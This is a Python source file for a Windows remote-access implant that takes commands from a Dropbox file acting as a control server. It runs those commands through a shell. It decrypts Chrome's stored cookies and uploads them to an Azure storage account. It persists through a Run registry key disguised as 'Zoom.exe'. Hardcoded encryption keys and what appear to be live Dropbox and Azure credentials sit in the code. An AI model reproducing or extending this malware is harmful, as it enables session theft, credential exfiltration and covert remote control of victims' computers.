import dropbox
import subprocess
import time
import random
import sqlite3
import json
import winreg
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode
from Cryptodome.Cipher.AES import new, MODE_GCM
from win32.win32crypt import CryptUnprotectData
from azure.storage.blob import BlobServiceClient
from datetime import datetime


# Aes-128 Encryption
def encrypt_message(message):
    cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
    return ct_bytes

# Aes-128 bit Decryption
def decrypt_message(ct_bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
    pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return pt.decode()


# Function to merge host key, name, and value
def merge(host_key, name, value):
    return f"{host_key} -> {name}: {value}" 

# Function to decrypt encrypted values
def decrypt_value(key, encrypted_value):
    try:
        return new(key, MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16]).decode()
    except Exception as e:
        print(f"Error decrypting value: {e}")
        return None

# Function to decrypt encrypted values
def decrypt_value(key, encrypted_value):
    try:
        return new(key, MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16]).decode()
    except Exception as e:
        print(f"Error decrypting value: {e}")
        return None

# Function to get Chrome cookies
def get_chrome_cookies(db=None, output_file="chrome_cookies.txt"):
    # If no database provided, use default path
    if db is None:
        from os.path import expandvars
        db = expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')

    # Read the encrypted key from Local State file
    try:
        with open(db + '/../../../Local State') as f:
            key = CryptUnprotectData(b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:])[1]
    except (FileNotFoundError, KeyError, ValueError) as e:
        print(f"Error reading Local State file: {e}")
        return {}

    # Connect to Chrome cookies database
    try:
        conn = sqlite3.connect(db)
        conn.create_function('decrypt', 2, decrypt_value)
        conn.create_function('merge', 3, merge)
        
        # Fetch all rows from the cookies table
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, decrypt(?, encrypted_value) FROM cookies ORDER BY host_key", (key,))
        rows = cursor.fetchall()
        
        # Construct the dictionary of cookies
        cookies = {}
        for row in rows:
            host_key, name, value = row
            key = f"{host_key} -> {name}"
            cookies[key] = value
        
        # Write cookies to output file
        with open(output_file, "w") as file:
            for host_and_name, cookie in cookies.items():
                file.write(f"{host_and_name}: {cookie}\n")
        
        print(f"Decrypted cookies written to '{output_file}'")
        return cookies
        
    except sqlite3.Error as e:
        print(f"Error accessing Chrome cookies database: {e}")
        return {}


def get_firefox_cookies():
    pass


# Exfil data to Azure 
def exfil():
    cookies = get_chrome_cookies()

    connection_string = "DefaultEndpointsProtocol=https;AccountName=ops10101;AccountKey=I35Mk/My6QLuP86/xBhsi/2IQCvgO4Lh4bj5rjUAoW5drKHsXBpeFtm19x4i8mD0WKCE+LkbQFAH+AStx0oOog==;EndpointSuffix=core.windows.net"
    container_name = "test324"

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_azure = f"chrome_azure_{timestamp}"
    file_local = "chrome_cookies.txt"


    try:
        # Azure Authentication
        blob_service_client = BlobServiceClient.from_connection_string(connection_string)
        blob_client = blob_service_client.get_blob_client(container=container_name, blob=file_azure)

        # OPen chrome cookies file and upload
        with open(file_local, "rb") as data:
            blob_client.upload_blob(data)

        print("[+] uploaded "+ file_local)
        write_output(b"Cookies File Uploaded to Azure")

    except Exception as e:
        write_output(b"Failed uploading to Azure")
        print(e)

def persistance():
    try:
        key_name = "Zoom.exe"  
        executable_path = r"C:\Users\susheel\Desktop\VsCode\DLLHij\dist\hello.exe"   # replace the path with drop location

        # Open the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)

        # Set the value
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)

        # Close the registry key
        winreg.CloseKey(key)
        write_output(b'Persistance Achieved')
        print("Startup entry added successfully.")

    except Exception as e:
        write_output(b'Failed adding registery key')
        print("An error occurred:", e)
    


# Execute the command 
def excecute(command):
    print('[+] Successfully read command from Dropbox Server')
    print(f'command form c2->{command}')
    command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()

    print(f'output->{output}')
    write_output(output)

# Write output back to the dropbox file
def write_output(output):
    prev_output = output
    output = encrypt_message(output)
    dbx.files_upload(output, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
    print("[+] Response written to Dropbox Server")

    check_new_command(prev_output)

# Check for the new commands from the c2 server in the dropbox file
def check_new_command(prev_output):
    while True:
        _, response = dbx.files_download(dropbox_path)
        new_command = decrypt_message(response.content)

        #print(f'new-cmd{new_command}, prev_output{prev_output}')

        if (new_command == prev_output.decode()):
            print('[-] No new commands from c2')
            n = random.randint(5,10)
            time.sleep(n)
        
        elif new_command == 'exit':
            break

        elif new_command == 'get_cookies':
            exfil()

        elif new_command == 'persistance':
            persistance()
            
        else:
            excecute(new_command)



if __name__ == '__main__':
    key = "564cybereffectss".encode()
    CONST_IV = 'qwertyuiopasdfgh'.encode()

    # dropbox init
    # with open("token.txt", "r") as f:
    #     token = f.read()

    token = "sl.BzeK72Mpf5vXSc_vEDUBjC-9597AgViP3MghTc71ych10QOWcG5oAgM2AiHa4UOiFyUFwzgx7OaLfRz0r4YTXVuHu1yTGiK_pdGZK5YRO5SagCv0qnKJodFury1npzFcG2-RycPCeJKfTUOuT8BP"

    dbx = dropbox.Dropbox(token)
    dropbox_path = '/c2/payload.txt'

    prev_command = None

    # start payload execution
    _, response = dbx.files_download(dropbox_path)
    command = decrypt_message(response.content)

    excecute(command)